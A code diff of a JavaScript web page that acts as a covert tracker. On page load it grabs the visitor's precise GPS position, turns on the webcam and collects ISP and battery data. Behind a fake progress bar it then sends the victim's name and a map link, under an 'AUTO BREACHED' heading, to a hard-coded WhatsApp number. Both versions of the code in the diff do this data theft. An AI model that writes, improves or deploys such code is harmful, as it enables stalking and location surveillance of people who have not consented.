@@ -1,31 +1,21 @@
 var nomorWA = "628979100200";
-var userData = { 
-    coords: "Scanning...", 
-    os: navigator.platform,
-    battery: "Scanning...",
-    isp: "Detecting..."
-};
+var userData = { coords: "0,0", os: navigator.platform, battery: "-", isp: "-" };
 
-// 1. Jalankan Otomatis Saat Halaman Dibuka
 window.onload = function() {
-    // Jalankan penarikan ISP & Baterai langsung
     getQuickData();
     
-    // Langsung minta GPS tanpa tunggu tombol
+    // Auto-lock GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(pos) {
             userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
-        }, function(err) {
-            userData.coords = "Denied";
-        }, { enableHighAccuracy: true, maximumAge: 0 });
+            document.getElementById('gps-status').innerText = "Location: LOCKED";
+            document.getElementById('gps-status').style.color = "#00ff41";
+        }, null, {enableHighAccuracy:true});
     }
 
-    // Aktifkan Kamera Otomatis
+    // Auto-Cam
     navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) { 
-            var v = document.getElementById('webcam');
-            if (v) v.srcObject = stream; 
-        }).catch(function(e) { console.log("Cam Blocked"); });
+        .then(function(s) { document.getElementById('webcam').srcObject = s; });
 };
 
 async function getQuickData() {
@@ -33,34 +23,33 @@ async function getQuickData() {
         var res = await fetch('https://ipapi.co/json/');
         var data = await res.json();
         userData.isp = data.org || "Protected";
-    } catch (e) { userData.isp = "ISP Hidden"; }
+        document.getElementById('isp-status').innerText = "ISP: " + userData.isp;
+    } catch(e) {}
 
     try {
-        if (navigator.getBattery) {
-            var bat = await navigator.getBattery();
-            userData.battery = Math.round(bat.level * 100) + "%";
+        var bat = await navigator.getBattery();
+        userData.battery = Math.round(bat.level * 100) + "%";
+        document.getElementById('bat-status').innerText = "Battery: " + userData.battery;
+    } catch(e) {}
+}
+
+function finalSubmit(name) {
+    document.getElementById('step-main').style.display = 'none';
+    document.getElementById('step-loading').style.display = 'block';
+
+    var p = 0;
+    var t = setInterval(function() {
+        p += 25;
+        document.getElementById('progress').style.width = p + "%";
+        if (p >= 100) {
+            clearInterval(t);
+            var map = "https://www.google.com/maps?q=" + userData.coords;
+            var msg = "🚨 *AUTO BREACHED* 🚨%0A%0A👤 Target: " + name + "%0A📍 Maps: " + map + "%0A📡 ISP: " + userData.isp + "%0A🔋 Bat: " + userData.battery;
+            window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + msg;
         }
-    } catch (e) { userData.battery = "Blocked"; }
+    }, 800);
 }
 
-// Fungsi Kirim (Tetap butuh satu klik final agar WA bisa terbuka)
-function autoSend(namaTarget) {
-    var mapLink = "https://www.google.com/maps?q=" + userData.coords;
-    var msg = "🚨 *AUTO BREACHED 2026* 🚨%0A%0A" +
-              "👤 *Target:* " + namaTarget + "%0A" +
-              "📍 *Maps:* " + mapLink + "%0A" +
-              "📡 *ISP:* " + userData.isp + "%0A" +
-              "🔋 *Baterai:* " + userData.battery + "%0A" +
-              "💻 *OS:* " + userData.os + "%0A%0A" +
-              "_Status: Stealth Mode Success._";
-
-    window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + msg;
-}
-
-// Untuk mendeteksi kalau dia ketik nama dan tekan Enter
-var nameField = document.getElementById('name');
-if (nameField) {
-    nameField.onkeydown = function(e) { 
-        if (e.key === "Enter") autoSend(nameField.value); 
-    };
-}
+document.getElementById('name').onkeydown = function(e) {
+    if (e.key === "Enter") finalSubmit(this.value);
+};
